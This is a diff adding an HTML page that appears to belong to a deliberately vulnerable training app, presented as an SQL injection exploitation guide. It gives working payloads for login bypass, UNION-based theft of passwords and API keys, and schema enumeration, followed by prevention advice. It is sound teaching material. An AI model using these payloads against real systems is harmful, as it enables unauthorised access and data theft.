@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Exploitation Guide - SQL Injection Demo</title>
+	<style>
+		* { margin: 0; padding: 0; box-sizing: border-box; }
+		body {
+			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+			min-height: 100vh;
+			padding: 20px;
+		}
+		.container {
+			max-width: 1000px;
+			margin: 0 auto;
+			background: white;
+			border-radius: 15px;
+			box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+			padding: 40px;
+		}
+		h1 {
+			color: #764ba2;
+			margin-bottom: 30px;
+			text-align: center;
+		}
+		h2 {
+			color: #667eea;
+			margin: 30px 0 15px 0;
+			padding-bottom: 10px;
+			border-bottom: 2px solid #667eea;
+		}
+		h3 {
+			color: #764ba2;
+			margin: 20px 0 10px 0;
+		}
+		.section {
+			margin-bottom: 30px;
+		}
+		code {
+			background: #f4f4f4;
+			padding: 3px 6px;
+			border-radius: 4px;
+			font-family: 'Courier New', monospace;
+			color: #e83e8c;
+		}
+		.code-block {
+			background: #2d2d2d;
+			color: #f8f8f2;
+			padding: 20px;
+			border-radius: 8px;
+			overflow-x: auto;
+			margin: 15px 0;
+			font-family: 'Courier New', monospace;
+		}
+		.warning-box {
+			background: #fff3cd;
+			border-left: 4px solid #ffc107;
+			padding: 15px;
+			margin: 20px 0;
+			border-radius: 5px;
+		}
+		.success-box {
+			background: #d4edda;
+			border-left: 4px solid #28a745;
+			padding: 15px;
+			margin: 20px 0;
+			border-radius: 5px;
+		}
+		.danger-box {
+			background: #f8d7da;
+			border-left: 4px solid #dc3545;
+			padding: 15px;
+			margin: 20px 0;
+			border-radius: 5px;
+		}
+		ul, ol {
+			margin-left: 30px;
+			margin-top: 10px;
+		}
+		li {
+			margin: 8px 0;
+			line-height: 1.6;
+		}
+		.back-link {
+			display: block;
+			text-align: center;
+			margin-top: 30px;
+			padding: 15px;
+			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+			color: white;
+			text-decoration: none;
+			border-radius: 8px;
+			font-weight: bold;
+		}
+		.back-link:hover {
+			opacity: 0.9;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<h1>📚 SQL Injection Exploitation Guide</h1>
+
+		<div class="danger-box">
+			<strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong><br>
+			This guide demonstrates SQL injection vulnerabilities for educational purposes. 
+			Never use these techniques on systems you don't own or have permission to test.
+		</div>
+
+		<div class="section">
+			<h2>🎯 Exploitation Examples</h2>
+
+			<h3>1. Authentication Bypass (Login Page)</h3>
+			<p>The login form uses unsafe string concatenation, allowing authentication bypass:</p>
+			
+			<div class="code-block">
+-- Original Query:
+SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'
+
+-- Injected Input in username field:
+' OR '1'='1
+
+-- Resulting Query:
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
+			</div>
+
+			<p>This returns all users because <code>'1'='1'</code> is always true. You'll be logged in as the first user (admin).</p>
+
+			<div class="success-box">
+				<strong>Try these payloads:</strong>
+				<ul>
+					<li><code>' OR '1'='1</code> (in username field)</li>
+					<li><code>admin'--</code> (logs in as admin without password)</li>
+					<li><code>' OR 1=1--</code> (comments out the rest of the query)</li>
+				</ul>
+			</div>
+
+			<h3>2. Data Exfiltration (Search Page)</h3>
+			<p>The search function allows UNION-based SQL injection to extract data from other tables:</p>
+
+			<div class="code-block">
+-- Original Query:
+SELECT * FROM products WHERE name LIKE '%INPUT%' OR description LIKE '%INPUT%'
+
+-- Injected Input:
+' UNION SELECT id, confidential_info, api_key, notes, 1 FROM secret_data--
+
+-- Resulting Query:
+SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, confidential_info, api_key, notes, 1 FROM secret_data--%'
+			</div>
+
+			<div class="success-box">
+				<strong>Try these UNION payloads:</strong>
+				<ul>
+					<li><code>' UNION SELECT id, confidential_info, api_key, notes, 1 FROM secret_data-- </code></li>
+					<li><code>' UNION SELECT id, username, password, email, role FROM users-- </code></li>
+					<li><code>' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables-- </code></li>
+				</ul>
+			</div>
+
+			<h3>3. Database Enumeration</h3>
+			<p>Discover database structure using information_schema:</p>
+
+			<div class="code-block">
+-- List all tables:
+' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- List columns of a specific table:
+' UNION SELECT NULL, column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='secret_data'--
+
+-- Get database version:
+' UNION SELECT NULL, @@version, NULL, NULL, NULL--
+			</div>
+		</div>
+
+		<div class="section">
+			<h2>🛡️ Why This Is Dangerous</h2>
+			<ul>
+				<li><strong>Data Breach:</strong> Attackers can read sensitive data from any table</li>
+				<li><strong>Authentication Bypass:</strong> Login systems can be completely circumvented</li>
+				<li><strong>Data Manipulation:</strong> With proper injection, data can be modified or deleted</li>
+				<li><strong>System Takeover:</strong> In some cases, attackers can execute system commands</li>
+			</ul>
+		</div>
+
+		<div class="section">
+			<h2>✅ How to Prevent SQL Injection</h2>
+			
+			<h3>1. Use Prepared Statements (Parameterized Queries)</h3>
+			<div class="code-block">
+// INSECURE - String Concatenation:
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+
+// SECURE - Prepared Statement:
+const query = 'SELECT * FROM users WHERE username = ?';
+db.query(query, [username], (err, results) => {
+	// Safe execution
+});
+			</div>
+
+			<h3>2. Use ORM Libraries</h3>
+			<p>Use Object-Relational Mapping libraries like Sequelize, TypeORM, or Prisma that handle escaping automatically.</p>
+
+			<h3>3. Input Validation</h3>
+			<ul>
+				<li>Validate and sanitize all user inputs</li>
+				<li>Use allowlists for expected values</li>
+				<li>Implement proper type checking</li>
+				<li>Limit input length</li>
+			</ul>
+
+			<h3>4. Principle of Least Privilege</h3>
+			<ul>
+				<li>Database users should have minimal permissions</li>
+				<li>Don't use root/admin accounts for web applications</li>
+				<li>Separate read and write permissions</li>
+			</ul>
+
+			<h3>5. Security Best Practices</h3>
+			<ul>
+				<li>Never display detailed error messages to users</li>
+				<li>Use Web Application Firewalls (WAF)</li>
+				<li>Regular security audits and penetration testing</li>
+				<li>Keep frameworks and libraries updated</li>
+			</ul>
+		</div>
+
+		<div class="warning-box">
+			<strong>📖 Learning Resources:</strong>
+			<ul>
+				<li>OWASP Top 10 - SQL Injection</li>
+				<li>PortSwigger Web Security Academy</li>
+				<li>DVWA (Damn Vulnerable Web Application)</li>
+			</ul>
+		</div>
+
+		<a href="/" class="back-link">← Back to Home</a>
+	</div>
+</body>
+</html>
